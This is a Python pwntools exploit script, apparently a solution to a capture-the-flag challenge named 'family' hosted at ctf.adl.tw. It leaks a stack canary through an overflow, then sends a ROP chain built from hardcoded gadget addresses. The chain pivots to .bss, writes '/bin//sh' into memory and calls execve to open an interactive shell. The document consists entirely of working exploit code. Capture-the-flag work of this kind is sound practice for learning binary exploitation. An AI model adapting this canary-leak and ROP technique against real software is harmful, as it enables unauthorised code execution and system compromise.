#!/usr/bin/python3

from pwn import *
import sys

bname = './family'
context.binary = bname
e = ELF(bname)

if len(sys.argv) > 1:
    r = remote('ctf.adl.tw', 11006)
else:
    r = process(bname)

r.send('A'*0x19)
r.recvuntil('A'*0x19)
canary = u64(b'\x00'+r.recv()[:7])
pop_rax_ret = 0x000000000044a30c
pop_rdi_ret = 0x0000000000400696
pop_rdx_ret = 0x000000000044a365
pop_rsi_ret = 0x0000000000410713
push_rsp_ret = 0x000000000044974b
push_rbp_ret = 0x00000000004b6996
mov_ptr_rsi_rax_ret = 0x00000000004801d1
syscall_addr = 0x000000000040132c
bss = 0x6bc000
sh_addr = 0x00000000006b7000
main_read = 0x0000000000400c80


"""
return
rax   : 0x0
rsi   : 0x0
rdi   : 0x1
rdx   : 0x00000000006bcd30
"""
sys_payload = flat(
    b'A'*0x18,
    p64(canary),
    p64(bss), # old rbp
    p64(pop_rsi_ret),
    p64(bss-0x20),
    p64(main_read),
)

read_payload = flat(
    p64(bss),
    b'A'*0x10,
    p64(canary),
    b'Q'*0x8, # 0x28
    
    p64(pop_rax_ret),
    b'/bin//sh',
    p64(pop_rsi_ret),
    p64(sh_addr),
    p64(mov_ptr_rsi_rax_ret),
    p64(pop_rdi_ret),
    p64(sh_addr),
    
    p64(pop_rsi_ret),
    p64(0),
    p64(pop_rdx_ret),
    p64(0),
    p64(pop_rax_ret),
    p64(0x3b),
    p64(syscall_addr), # 0x50
)
r.send(sys_payload)
input()
r.send(read_payload)
r.interactive()
